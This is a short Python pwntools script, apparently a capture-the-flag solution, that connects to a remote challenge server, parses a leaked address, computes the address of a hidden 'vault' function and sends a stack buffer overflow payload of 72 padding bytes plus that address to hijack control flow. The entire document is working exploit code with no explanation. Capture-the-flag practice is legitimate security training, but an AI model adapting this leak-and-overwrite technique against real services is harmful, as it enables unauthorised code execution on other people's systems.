from pwn import *

context.log_level = 'info'

def exploit():
    # p = process('./precision_measurements')
    p = remote('challenges.mcsc.space', 2222)
    
    p.recvuntil(b'Discovered Harappan weight marker: ')
    leaked_addr = int(p.recvline().strip(), 16)
    log.info(f"Found weight_standard at: {hex(leaked_addr)}")
    
    offset = 234
    vault_addr = leaked_addr - offset
    log.info(f"Calculated harappan_vault address: {hex(vault_addr)}")
    
    p.recvuntil(b'Enter the ancient Harappan measurement code: ')
    
    payload = b'A' * 72 + p64(vault_addr)
    p.sendline(payload)
    
    response = p.recvall()
    response_str = response.decode('utf-8', errors='ignore')
    print(response_str)

if __name__ == "__main__":
    exploit()
